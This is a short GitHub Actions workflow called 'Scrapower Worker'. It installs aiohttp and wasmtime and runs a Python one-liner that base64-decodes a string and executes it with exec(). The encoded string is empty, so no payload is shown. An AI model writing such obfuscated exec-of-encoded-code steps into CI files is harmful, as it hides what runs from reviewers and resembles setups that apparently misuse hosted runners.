name: Scrapower Worker
on:
  workflow_dispatch:
jobs:
  worker:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: Install
        run: pip install aiohttp wasmtime
      - name: Run Worker
        run: python -c "import base64;exec(base64.b64decode('').decode())"
